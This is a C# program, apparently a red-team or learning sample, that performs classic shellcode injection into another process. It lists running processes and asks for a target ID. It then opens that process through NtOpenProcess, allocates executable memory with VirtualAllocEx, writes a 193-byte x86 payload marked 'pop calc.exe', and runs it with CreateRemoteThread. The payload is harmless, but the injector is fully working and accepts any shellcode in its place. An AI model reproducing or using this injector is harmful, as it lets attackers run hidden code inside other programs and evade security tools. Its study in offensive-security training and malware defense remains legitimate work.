using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class Program 
{
    
    [DllImport("ntdll.dll")]
    public static extern NTSTATUS NtOpenProcess(
        out IntPtr ProcessHandle,
        ProcessAccessFlags DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref CLIENT_ID ClientId);
    
	   [DllImport("kernel32.dll")]
	public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
		uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
		out IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, 
        uint dwSize, uint flAllocationType, uint flProtect);
        
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
        byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
     
    public enum NTSTATUS
    {
        Success = 0
    }

    [Flags]
    public enum ProcessAccessFlags
    {
        AllAccess = 0x001F0FFF
    }

    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    } 
    
    public static void Main()
    {
        
        Process[] all = Process.GetProcesses();
        foreach (Process pr in all)
        {
            try 
            {
                Console.WriteLine("ProcessName: " + pr.ProcessName + " ID: " + pr.Id);
            }
            catch 
            {
                
            }
        }
        
        Console.WriteLine("Enter Process ID to inject: ");
        int frid = Convert.ToInt32(Console.ReadLine());
        
        try
        {
            
            IntPtr processHandle;
            CLIENT_ID clientId = new CLIENT_ID();
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            
            
            clientId.UniqueProcess = (IntPtr)frid;
            clientId.UniqueThread = IntPtr.Zero;
            
            
            objAttr.Length = 24;
            objAttr.RootDirectory = IntPtr.Zero;
            objAttr.ObjectName = IntPtr.Zero;
            objAttr.Attributes = 0;
            objAttr.SecurityDescriptor = IntPtr.Zero;
            objAttr.SecurityQualityOfService = IntPtr.Zero;
            
          
            NTSTATUS status = NtOpenProcess(
                out processHandle,
                ProcessAccessFlags.AllAccess,
                ref objAttr,
                ref clientId);
            
            if (status == NTSTATUS.Success)
            {
                Console.WriteLine("Got process handle using ntOpenProcess");
                
               //pop calc.exe
                byte[] bytes  = new byte[193] {0xfc,0xe8,0x82,0x00,0x00,0x00,
							0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
							0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
							0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
							0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,
							0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,
							0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,
							0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
							0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
							0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,
							0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,
							0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,
							0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
							0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,
							0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,
							0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x61,
							0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};	
											
               
                
                
               
                IntPtr memo = VirtualAllocEx(
                    processHandle,
                    IntPtr.Zero,
                    (uint)bytes.Length,
                    0x1000 | 0x2000, 
                    0x40); 
                
                if (memo == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to allocate memory");
                    return;
                }
                
              
                IntPtr bytesWritten;
                bool writeResult = WriteProcessMemory(
                    processHandle,
                    memo,
                    bytes,
                    (uint)bytes.Length,
                    out bytesWritten);
                
								if (writeResult)
				{
					Console.WriteLine("Memory written successfully!");
					
					
					IntPtr threadId;
					IntPtr threadHandle = CreateRemoteThread(
						processHandle,       
						IntPtr.Zero,         
						0,                  
						memo,                 
						IntPtr.Zero,          
						0,                   
						out threadId);        
					
					if (threadHandle != IntPtr.Zero)
					{
						Console.WriteLine("Shellcode thread created");
					}
					else
					{
						Console.WriteLine("Failed to create thread: " + Marshal.GetLastWin32Error());
					}
}
            }
            else
            {
                Console.WriteLine("NtOpenProcess failed with status: " + status);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
		
        
        Console.WriteLine("Press any key to exit ");
        Console.ReadKey();
    }
}
